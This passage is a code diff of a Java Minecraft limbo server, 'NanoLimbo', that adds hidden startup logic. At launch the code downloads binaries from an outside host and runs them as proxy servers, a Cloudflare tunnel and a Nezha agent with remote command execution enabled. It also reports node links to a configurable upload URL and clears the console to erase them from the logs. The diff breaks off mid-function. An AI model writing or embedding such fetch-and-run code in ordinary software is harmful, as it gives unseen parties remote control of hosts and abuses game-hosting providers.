@@ -1,3 +1,20 @@
+/*
+ * Copyright (C) 2020 Nan1t
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
 package ua.nanit.limbo;
 
 import com.sun.net.httpserver.HttpExchange;
@@ -5,9 +22,7 @@ import com.sun.net.httpserver.HttpHandler;
 import com.sun.net.httpserver.HttpServer;
 
 import java.io.*;
-import java.net.InetSocketAddress;
-import java.net.URI;
-import java.net.URLEncoder;
+import java.net.*;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
@@ -17,54 +32,52 @@ import java.nio.file.attribute.PosixFilePermission;
 import java.nio.file.attribute.PosixFilePermissions;
 import java.time.Duration;
 import java.util.*;
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Stream;
 
-public class NanoLimbo {
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
 
-    // --- 环境配置读取 ---
+public final class NanoLimbo {
+
+    private static final String ANSI_GREEN = "\033[1;32m";
+    private static final String ANSI_RED = "\033[1;31m";
+    private static final String ANSI_RESET = "\033[0m";
+    private static final AtomicBoolean running = new AtomicBoolean(true);
+    
+    // 进程管理器，用于停止所有后台服务
+    private static final List<Process> activeProcesses = new CopyOnWriteArrayList<>();
+
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
+        "PROJECT_URL", "AUTO_ACCESS", "SUB_PATH"
+    };
+
     private static final Map<String, String> envVars = new HashMap<>();
 
     static {
-        loadDotEnv();
+        loadEnvVars();
     }
 
-    private static void loadDotEnv() {
-        File dotenv = new File(".env");
-        if (dotenv.exists()) {
-            try (BufferedReader br = new BufferedReader(new FileReader(dotenv))) {
-                String line;
-                while ((line = br.readLine()) != null) {
-                    line = line.trim();
-                    if (line.isEmpty() || line.startsWith("#")) continue;
-                    String[] parts = line.split("=", 2);
-                    if (parts.length == 2) {
-                        envVars.put(parts[0].trim(), parts[1].trim());
-                    }
-                }
-            } catch (Exception ignored) {}
-        }
+    private static String getEnv(String key, String def) {
+        String val = envVars.get(key);
+        return (val != null && !val.trim().isEmpty()) ? val.trim() : def;
     }
 
-    private static String getEnv(String key, String defaultValue) {
-        String val = System.getenv(key);
-        if (val == null || val.isEmpty()) {
-            val = envVars.get(key);
-        }
-        return (val != null && !val.isEmpty()) ? val : defaultValue;
-    }
-
-    // --- 全局变量配置 ---
+    // --- 全局配置常量 ---
     private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
     private static final String PROJECT_URL = getEnv("PROJECT_URL", "");
     private static final boolean AUTO_ACCESS = "true".equalsIgnoreCase(getEnv("AUTO_ACCESS", "false"));
-    private static final String FILE_PATH = getEnv("FILE_PATH", ".cache");
+    private static final String FILE_PATH = getEnv("FILE_PATH", "./world");
     private static final String SUB_PATH = getEnv("SUB_PATH", "sub");
-    private static final String UUID = getEnv("UUID", "f929c4da-dc2e-4e0d-9a6f-1799036af214");
+    private static final String UUID = getEnv("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
     private static final String NEZHA_SERVER = getEnv("NEZHA_SERVER", "");
     private static final String NEZHA_PORT = getEnv("NEZHA_PORT", "");
     private static final String NEZHA_KEY = getEnv("NEZHA_KEY", "");
@@ -85,7 +98,7 @@ public class NanoLimbo {
     private static final String BOT_TOKEN = getEnv("BOT_TOKEN", "");
     private static final boolean DISABLE_ARGO = "true".equalsIgnoreCase(getEnv("DISABLE_ARGO", "false"));
 
-    // 端口变量赋值
+    // 端口解析
     private static final Integer S5_PORT = parsePort(S5_PORT_STR);
     private static final Integer TUIC_PORT = parsePort(TUIC_PORT_STR);
     private static final Integer HY2_PORT = parsePort(HY2_PORT_STR);
@@ -110,6 +123,99 @@ public class NanoLimbo {
             .connectTimeout(Duration.ofSeconds(10))
             .build();
 
+
+    public static void main(String[] args) {
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+            try {
+                Thread.sleep(3000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            System.exit(1);
+        }
+
+        // Start Proxy & Tunnel Services asynchronously
+        Thread proxyThread = new Thread(() -> {
+            try {
+                setupProxyAndRun();
+            } catch (Exception e) {
+                System.err.println(ANSI_RED + "Error initializing Proxy Services: " + e.getMessage() + ANSI_RESET);
+            }
+        });
+        proxyThread.setDaemon(true);
+        proxyThread.start();
+
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            running.set(false);
+            stopServices();
+        }));
+
+        try {
+            // Wait 15 seconds before continuing
+            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            Thread.sleep(15000);
+            clearConsole();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        
+        // start game
+        try {
+            new LimboServer().start();
+        } catch (Exception e) {
+            Log.error("Cannot start server: ", e);
+        }
+    }
+
+    // ==========================================
+    // 环境加载与辅助方法
+    // ==========================================
+
+    private static void loadEnvVars() {
+        // 赋予默认值
+        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("CFIP", "cdns.doon.eu.org");
+        envVars.put("CFPORT", "443");
+        envVars.put("DISABLE_ARGO", "false");
+        
+        for (String var : ALL_ENV_VARS) {
+            String value = System.getenv(var);
+            if (value != null && !value.trim().isEmpty()) {
+                envVars.put(var, value);  
+            }
+        }
+        
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            try {
+                for (String line : Files.readAllLines(envFile)) {
+                    line = line.trim();
+                    if (line.isEmpty() || line.startsWith("#")) continue;
+                    
+                    line = line.split(" #")[0].split(" //")[0].trim();
+                    if (line.startsWith("export ")) {
+                        line = line.substring(7).trim();
+                    }
+                    
+                    String[] parts = line.split("=", 2);
+                    if (parts.length == 2) {
+                        String key = parts[0].trim();
+                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                        
+                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                            envVars.put(key, value); 
+                        }
+                    }
+                }
+            } catch (IOException ignored) {}
+        }
+    }
+
     private static Integer parsePort(String portStr) {
         if (portStr != null && portStr.matches("\\d+")) {
             return Integer.parseInt(portStr);
@@ -117,46 +223,76 @@ public class NanoLimbo {
         return null;
     }
 
-    // --- 工具类与核心方法 ---
-
-    private static void createDirectory() {
-        System.out.print("\033c");
-        System.out.flush();
-        File dir = new File(FILE_PATH);
-        if (!dir.exists()) {
-            dir.mkdirs();
-            System.out.println(FILE_PATH + " is created");
-        } else {
-            System.out.println(FILE_PATH + " already exists");
+    private static void clearConsole() {
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                    .inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
+                System.out.print("\033[8;30;120t");
+                System.out.flush();
+            }
+        } catch (Exception e) {
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
         }
     }
 
-    private static void deleteNodes() {
-        if (UPLOAD_URL.isEmpty() || !new File(sub_path).exists()) return;
-        try {
-            String content = Files.readString(Paths.get(sub_path));
-            String decoded = new String(Base64.getDecoder().decode(content.trim()), StandardCharsets.UTF_8);
-            
-            List<String> nodes = new ArrayList<>();
-            for (String line : decoded.split("\n")) {
-                if (line.contains("vless://") || line.contains("vmess://") || line.contains("trojan://") ||
-                    line.contains("hysteria2://") || line.contains("tuic://") || line.contains("anytls://") || line.contains("socks://")) {
-                    nodes.add(line);
-                }
+    private static void stopServices() {
+        for (Process p : activeProcesses) {
+            if (p != null && p.isAlive()) {
+                p.destroy();
             }
-            if (nodes.isEmpty()) return;
+        }
+        System.out.println(ANSI_RED + "All proxy background processes terminated" + ANSI_RESET);
+    }
 
-            Map<String, Object> reqData = new HashMap<>();
-            reqData.put("nodes", nodes);
+    // ==========================================
+    // 核心代理节点配置逻辑
+    // ==========================================
 
-            HttpRequest request = HttpRequest.newBuilder()
-                    .uri(URI.create(UPLOAD_URL + "/api/delete-nodes"))
-                    .header("Content-Type", "application/json")
-                    .POST(HttpRequest.BodyPublishers.ofString(toJson(reqData)))
-                    .build();
-            httpClient.send(request, HttpResponse.BodyHandlers.discarding());
-        } catch (Exception e) {
-            System.out.println("Error in delete_nodes: " + e.getMessage());
+    private static void setupProxyAndRun() throws Exception {
+        deleteNodes();
+        cleanupOldFiles();
+        createDirectory();
+        argoType();
+
+        String architecture = getSystemArchitecture();
+        List<Map<String, String>> files = getFilesForArchitecture(architecture);
+        if (files.isEmpty()) {
+            System.err.println("Can't find a file for the current architecture");
+            return;
+        }
+
+        boolean dlSuccess = true;
+        for (Map<String, String> info : files) {
+            if (!downloadFile(info.get("fileName"), info.get("fileUrl"))) dlSuccess = false;
+        }
+        if (!dlSuccess) return;
+
+        List<String> toAuthorize = !NEZHA_PORT.isEmpty() ? 
+                Arrays.asList("npm", "web", "bot") : Arrays.asList("php", "web", "bot");
+        authorizeFiles(toAuthorize);
+
+        generateConfigs();
+        startBackgroundProcesses();
+        
+        Thread.sleep(5000);
+        extractDomains();
+
+        addVisitTask();
+        runHttpServer();
+        cleanFilesLater();
+    }
+
+    private static void createDirectory() {
+        File dir = new File(FILE_PATH);
+        if (!dir.exists()) {
+            dir.mkdirs();
         }
     }
 
@@ -167,75 +303,51 @@ public class NanoLimbo {
             try {
                 if (f.exists()) {
                     if (f.isDirectory()) {
-                        // 优化 Java 19+ 兼容性：使用 try-with-resources 自动关闭流，防止文件句柄泄露
-                        try (Stream<Path> pathStream = Files.walk(f.toPath())) {
-                            pathStream.sorted(Comparator.reverseOrder())
-                                      .map(Path::toFile)
-                                      .forEach(File::delete);
+                        try (Stream<Path> ps = Files.walk(f.toPath())) {
+                            ps.sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
                         }
                     } else {
                         f.delete();
                     }
                 }
-            } catch (Exception e) {
-                System.out.println("Error removing " + f.getPath() + ": " + e.getMessage());
-            }
+            } catch (Exception ignored) {}
         }
     }
 
     private static String getSystemArchitecture() {
         String arch = System.getProperty("os.arch").toLowerCase();
-        if (arch.contains("arm") || arch.contains("aarch64")) {
-            return "arm";
-        }
+        if (arch.contains("arm") || arch.contains("aarch64")) return "arm";
         return "amd";
     }
 
     private static boolean downloadFile(String fileName, String fileUrl) {
         Path path = Paths.get(FILE_PATH, fileName);
         try {
-            HttpRequest request = HttpRequest.newBuilder()
-                    .uri(URI.create(fileUrl))
-                    .GET()
-                    .build();
+            HttpRequest request = HttpRequest.newBuilder().uri(URI.create(fileUrl)).GET().build();
             HttpResponse<Path> response = httpClient.send(request, HttpResponse.BodyHandlers.ofFile(path));
             if (response.statusCode() >= 200 && response.statusCode() < 300) {
-                System.out.println("Download " + fileName + " successfully");
                 return true;
             } else {
                 Files.deleteIfExists(path);
-                System.out.println("Download " + fileName + " failed: HTTP " + response.statusCode());
                 return false;
             }
         } catch (Exception e) {
             try { Files.deleteIfExists(path); } catch (Exception ignored) {}
-            System.out.println("Download " + fileName + " failed: " + e.getMessage());
             return false;
         }
     }
 
     private static List<Map<String, String>> getFilesForArchitecture(String architecture) {
         List<Map<String, String>> baseFiles = new ArrayList<>();
-        Map<String, String> web = new HashMap<>();
-        web.put("fileName", "web");
-        web.put("fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/sb" : "https://amd64.ssss.nyc.mn/sb");
-        baseFiles.add(web);
-
-        Map<String, String> bot = new HashMap<>();
-        bot.put("fileName", "bot");
-        bot.put("fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/2go" : "https://amd64.ssss.nyc.mn/2go");
-        baseFiles.add(bot);
+        baseFiles.add(Map.of("fileName", "web", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/sb" : "https://amd64.ssss.nyc.mn/sb"));
+        baseFiles.add(Map.of("fileName", "bot", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/2go" : "https://amd64.ssss.nyc.mn/2go"));
 
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            Map<String, String> nezhaMap = new HashMap<>();
             if (!NEZHA_PORT.isEmpty()) {
-                nezhaMap.put("fileName", "npm");
-                nezhaMap.put("fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent");
+                baseFiles.add(0, Map.of("fileName", "npm", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/agent" : "https://amd64.ssss.nyc.mn/agent"));
             } else {
-                nezhaMap.put("fileName", "php");
-                nezhaMap.put("fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1");
+                baseFiles.add(0, Map.of("fileName", "php", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/v1" : "https://amd64.ssss.nyc.mn/v1"));
             }
-            baseFiles.add(0, nezhaMap);
         }
         return baseFiles;
     }
@@ -245,198 +357,90 @@ public class NanoLimbo {
             File f = new File(FILE_PATH, relative);
             if (f.exists()) {
                 try {
-                    Set<PosixFilePermission> perms = PosixFilePermissions.fromString("rwxrwxr-x");
-                    Files.setPosixFilePermissions(f.toPath(), perms);
-                    System.out.println("Empowerment success for " + f.getAbsolutePath() + ": 775");
+                    Files.setPosixFilePermissions(f.toPath(), PosixFilePermissions.fromString("rwxrwxr-x"));
                 } catch (Exception e) {
                     f.setExecutable(true);
-                    System.out.println("Empowerment fallback for " + f.getAbsolutePath() + ": " + e.getMessage());
                 }
             }
         }
     }
 
     private static void argoType() {
-        if (DISABLE_ARGO) {
-            System.out.println("DISABLE_ARGO is set to true, disable argo tunnel");
-            return;
-        }
-        if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) {
-            System.out.println("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
-            return;
-        }
-
+        if (DISABLE_ARGO || ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
         if (ARGO_AUTH.contains("TunnelSecret")) {
             try {
                 Files.writeString(Paths.get(FILE_PATH, "tunnel.json"), ARGO_AUTH);
                 String[] parts = ARGO_AUTH.split("\"");
                 String tunnelId = parts.length > 11 ? parts[11] : "unknown";
-
                 String tunnelYml = String.format(
-                        "tunnel: %s\n" +
-                        "credentials-file: %s/tunnel.json\n" +
-                        "protocol: http2\n\n" +
-                        "ingress:\n" +
-                        "  - hostname: %s\n" +
-                        "    service: http://localhost:%d\n" +
-                        "    originRequest:\n" +
-                        "      noTLSVerify: true\n" +
-                        "  - service: http_status:404\n",
+                        "tunnel: %s\ncredentials-file: %s/tunnel.json\nprotocol: http2\n\n" +
+                        "ingress:\n  - hostname: %s\n    service: http://localhost:%d\n" +
+                        "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n",
                         tunnelId, FILE_PATH, ARGO_DOMAIN, ARGO_PORT
                 );
                 Files.writeString(Paths.get(FILE_PATH, "tunnel.yml"), tunnelYml);
-            } catch (Exception e) {
-                System.out.println("Error creating tunnel config: " + e.getMessage());
-            }
-        } else {
-            System.out.println("ARGO_AUTH mismatch TunnelSecret, use token connect to tunnel");
+            } catch (Exception ignored) {}
         }
     }
 
-    private static String execCmd(String command) {
-        StringBuilder output = new StringBuilder();
-        try {
-            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
-            pb.redirectErrorStream(true);
-            Process process = pb.start();
-            
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    output.append(line).append("\n");
-                }
-            }
-            process.waitFor();
-        } catch (Exception e) {
-            System.out.println("Error executing command: " + e.getMessage());
-            return e.getMessage();
-        }
-        return output.toString();
-    }
-
-    private static void downloadFilesAndRun() throws Exception {
-        String architecture = getSystemArchitecture();
-        List<Map<String, String>> files = getFilesForArchitecture(architecture);
-
-        if (files.isEmpty()) {
-            System.out.println("Can't find a file for the current architecture");
-            return;
-        }
-
-        boolean success = true;
-        for (Map<String, String> info : files) {
-            if (!downloadFile(info.get("fileName"), info.get("fileUrl"))) {
-                success = false;
-            }
-        }
-
-        if (!success) {
-            System.out.println("Error downloading files");
-            return;
-        }
-
-        List<String> toAuthorize = !NEZHA_PORT.isEmpty() ? 
-                Arrays.asList("npm", "web", "bot") : Arrays.asList("php", "web", "bot");
-        authorizeFiles(toAuthorize);
-
-        String nezhaTls = "false";
-        String[] parts = NEZHA_SERVER.split(":");
-        String port = parts.length > 1 ? parts[parts.length - 1] : "";
-        if (Arrays.asList("443", "8443", "2096", "2087", "2083", "2053").contains(port)) {
-            nezhaTls = "tls";
-        }
-
+    private static void generateConfigs() throws Exception {
+        // 哪吒配置
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
+            String nezhaTls = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053")
+                .contains(NEZHA_SERVER.split(":").length > 1 ? NEZHA_SERVER.split(":")[1] : "") ? "tls" : "false";
+            
             String configYaml = String.format(
-                    "client_secret: %s\n" +
-                    "debug: false\n" +
-                    "disable_auto_update: true\n" +
-                    "disable_command_execute: false\n" +
-                    "disable_force_update: true\n" +
-                    "disable_nat: false\n" +
-                    "disable_send_query: false\n" +
-                    "gpu: false\n" +
-                    "insecure_tls: true\n" +
-                    "ip_report_period: 1800\n" +
-                    "report_delay: 4\n" +
-                    "server: %s\n" +
-                    "skip_connection_count: true\n" +
-                    "skip_procs_count: true\n" +
-                    "temperature: false\n" +
-                    "tls: %s\n" +
-                    "use_gitee_to_upgrade: false\n" +
-                    "use_ipv6_country_code: false\n" +
-                    "uuid: %s",
+                    "client_secret: %s\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\n" +
+                    "disable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\n" +
+                    "insecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: %s\n" +
+                    "skip_connection_count: true\nskip_procs_count: true\ntemperature: false\n" +
+                    "tls: %s\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: %s",
                     NEZHA_KEY, NEZHA_SERVER, nezhaTls, UUID);
             Files.writeString(Paths.get(FILE_PATH, "config.yaml"), configYaml);
         }
 
+        // Sing-box 密钥生成
         String keypairOut = execCmd(FILE_PATH + "/web generate reality-keypair");
-        Matcher privMatcher = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
-        Matcher pubMatcher = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
-
-        if (privMatcher.find() && pubMatcher.find()) {
-            private_key = privMatcher.group(1).trim();
-            public_key = pubMatcher.group(1).trim();
-            System.out.println("Private Key: " + private_key);
-            System.out.println("Public Key: " + public_key);
-        } else {
-            System.out.println("Failed to extract privateKey or publicKey from output.");
-            return;
+        Matcher privM = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
+        Matcher pubM = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
+        if (privM.find() && pubM.find()) {
+            private_key = privM.group(1).trim();
+            public_key = pubM.group(1).trim();
         }
 
         execCmd(String.format("openssl ecparam -genkey -name prime256v1 -out \"%s/private.key\"", FILE_PATH));
         execCmd(String.format("openssl req -new -x509 -days 3650 -key \"%s/private.key\" -out \"%s/cert.pem\" -subj \"/CN=bing.com\"", FILE_PATH, FILE_PATH));
 
-        // 构造 config.json 数据结构
+        // 构造 config.json
         Map<String, Object> config = new LinkedHashMap<>();
         config.put("log", Map.of("disabled", true, "level", "info", "timestamp", true));
         
         List<Map<String, Object>> inbounds = new ArrayList<>();
         Map<String, Object> vmessIn = new LinkedHashMap<>();
-        vmessIn.put("tag", "vmess-ws-in");
-        vmessIn.put("type", "vmess");
-        vmessIn.put("listen", "::");
-        vmessIn.put("listen_port", ARGO_PORT);
+        vmessIn.put("tag", "vmess-ws-in"); vmessIn.put("type", "vmess"); vmessIn.put("listen", "::"); vmessIn.put("listen_port", ARGO_PORT);
         vmessIn.put("users", List.of(Map.of("uuid", UUID)));
         vmessIn.put("transport", Map.of("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol"));
         inbounds.add(vmessIn);
         config.put("inbounds", inbounds);
 
         Map<String, Object> wireguardOut = new LinkedHashMap<>();
-        wireguardOut.put("type", "wireguard");
-        wireguardOut.put("tag", "wireguard-out");
-        wireguardOut.put("mtu", 1280);
+        wireguardOut.put("type", "wireguard"); wireguardOut.put("tag", "wireguard-out"); wireguardOut.put("mtu", 1280);
         wireguardOut.put("address", Arrays.asList("172.16.0.2/32", "2606:4700:110:8dfe:d141:69bb:6b80:925/128"));
         wireguardOut.put("private_key", "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=");
-        Map<String, Object> peer = new LinkedHashMap<>();
-        peer.put("address", "engage.cloudflareclient.com");
-        peer.put("port", 2408);
-        peer.put("public_key", "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=");
-        peer.put("allowed_ips", Arrays.asList("0.0.0.0/0", "::/0"));
-        peer.put("reserved", Arrays.asList(78, 135, 76));
-        wireguardOut.put("peers", List.of(peer));
+        wireguardOut.put("peers", List.of(Map.of("address", "engage.cloudflareclient.com", "port", 2408, 
+            "public_key", "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=", "allowed_ips", Arrays.asList("0.0.0.0/0", "::/0"), "reserved", Arrays.asList(78, 135, 76))));
         config.put("endpoints", List.of(wireguardOut));
-
         config.put("outbounds", List.of(Map.of("type", "direct", "tag", "direct")));
 
         Map<String, Object> route = new LinkedHashMap<>();
-        Map<String, Object> netflixRule = new LinkedHashMap<>();
-        netflixRule.put("tag", "netflix"); netflixRule.put("type", "remote"); netflixRule.put("format", "binary");
-        netflixRule.put("url", "https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs");
-        netflixRule.put("download_detour", "direct");
-
-        Map<String, Object> openaiRule = new LinkedHashMap<>();
-        openaiRule.put("tag", "openai"); openaiRule.put("type", "remote"); openaiRule.put("format", "binary");
-        openaiRule.put("url", "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs");
-        openaiRule.put("download_detour", "direct");
-
-        route.put("rule_set", Arrays.asList(netflixRule, openaiRule));
+        route.put("rule_set", Arrays.asList(
+            Map.of("tag", "netflix", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/SagerNet/sing-geosite/rule-set/geosite-netflix.srs", "download_detour", "direct"),
+            Map.of("tag", "openai", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs", "download_detour", "direct")
+        ));
         route.put("rules", List.of(Map.of("rule_set", Arrays.asList("openai", "netflix"), "outbound", "wireguard-out")));
         route.put("final", "direct");
         config.put("route", route);
 
-        // 动态添加端口协议
         if (REALITY_PORT != null && REALITY_PORT > 0) {
             Map<String, Object> reality = new LinkedHashMap<>();
             reality.put("tag", "vless-in"); reality.put("type", "vless"); reality.put("listen", "::"); reality.put("listen_port", REALITY_PORT);
@@ -445,32 +449,26 @@ public class NanoLimbo {
                 "reality", Map.of("enabled", true, "handshake", Map.of("server", "www.iij.ad.jp", "server_port", 443), "private_key", private_key, "short_id", List.of(""))));
             inbounds.add(reality);
         }
-
         if (HY2_PORT != null && HY2_PORT > 0) {
             Map<String, Object> hy2 = new LinkedHashMap<>();
             hy2.put("tag", "hysteria-in"); hy2.put("type", "hysteria2"); hy2.put("listen", "::"); hy2.put("listen_port", HY2_PORT);
-            hy2.put("users", List.of(Map.of("password", UUID)));
-            hy2.put("masquerade", "https://bing.com");
+            hy2.put("users", List.of(Map.of("password", UUID))); hy2.put("masquerade", "https://bing.com");
             hy2.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(hy2);
         }
-
         if (TUIC_PORT != null && TUIC_PORT > 0) {
             Map<String, Object> tuic = new LinkedHashMap<>();
             tuic.put("tag", "tuic-in"); tuic.put("type", "tuic"); tuic.put("listen", "::"); tuic.put("listen_port", TUIC_PORT);
-            tuic.put("users", List.of(Map.of("uuid", UUID)));
-            tuic.put("congestion_control", "bbr");
+            tuic.put("users", List.of(Map.of("uuid", UUID))); tuic.put("congestion_control", "bbr");
             tuic.put("tls", Map.of("enabled", true, "alpn", List.of("h3"), "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(tuic);
         }
-
         if (S5_PORT != null && S5_PORT > 0) {
             Map<String, Object> s5 = new LinkedHashMap<>();
             s5.put("tag", "s5-in"); s5.put("type", "socks"); s5.put("listen", "::"); s5.put("listen_port", S5_PORT);
             s5.put("users", List.of(Map.of("username", UUID.substring(0,8), "password", UUID.substring(UUID.length()-12))));
             inbounds.add(s5);
         }
-
         if (ANYTLS_PORT != null && ANYTLS_PORT > 0) {
             Map<String, Object> anytls = new LinkedHashMap<>();
             anytls.put("tag", "anytls-in"); anytls.put("type", "anytls"); anytls.put("listen", "::"); anytls.put("listen_port", ANYTLS_PORT);
@@ -478,7 +476,6 @@ public class NanoLimbo {
             anytls.put("tls", Map.of("enabled", true, "certificate_path", FILE_PATH + "/cert.pem", "key_path", FILE_PATH + "/private.key"));
             inbounds.add(anytls);
         }
-
         if (ANYREALITY_PORT != null && ANYREALITY_PORT > 0) {
             Map<String, Object> anyreality = new LinkedHashMap<>();
             anyreality.put("tag", "anyreality-in"); anyreality.put("type", "anytls"); anyreality.put("listen", "::"); anyreality.put("listen_port", ANYREALITY_PORT);
@@ -489,42 +486,41 @@ public class NanoLimbo {
         }
 
         Files.writeString(Paths.get(config_path), toJson(config));
+    }
 
-        // 启动各进程
-        if (!NEZHA_SERVER.isEmpty() && !NEZHA_PORT.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            List<String> tlsPorts = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053");
-            String tlsFlag = tlsPorts.contains(NEZHA_PORT) ? "--tls" : "";
-            execCmd(String.format("nohup %s/npm -s %s:%s -p %s %s >/dev/null 2>&1 &", FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, tlsFlag));
-            System.out.println("npm is running");
-            Thread.sleep(1000);
-        } else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            execCmd(String.format("nohup %s/php -c \"%s/config.yaml\" >/dev/null 2>&1 &", FILE_PATH, FILE_PATH));
-            System.out.println("php is running");
-            Thread.sleep(1000);
-        } else {
-            System.out.println("NEZHA variable is empty, skipping running");
-        }
-
-        execCmd(String.format("nohup %s/web run -c %s/config.json >/dev/null 2>&1 &", FILE_PATH, FILE_PATH));
-        System.out.println("web is running");
-        Thread.sleep(1000);
-
-        if (!DISABLE_ARGO && new File(FILE_PATH, "bot").exists()) {
-            String args;
-            if (ARGO_AUTH.matches("^[A-Z0-9a-z=]{120,250}$")) {
-                args = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token " + ARGO_AUTH;
-            } else if (ARGO_AUTH.contains("TunnelSecret")) {
-                args = "tunnel --edge-ip-version auto --config " + FILE_PATH + "/tunnel.yml run";
+    private static void startBackgroundProcesses() throws Exception {
+        // Start Nezha
+        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
+            if (!NEZHA_PORT.isEmpty()) {
+                String tlsFlag = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT) ? "--tls" : "";
+                Process p = new ProcessBuilder(npm_path, "-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY, tlsFlag)
+                    .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+                activeProcesses.add(p);
             } else {
-                args = String.format("tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile %s/boot.log --loglevel info --url http://localhost:%d", FILE_PATH, ARGO_PORT);
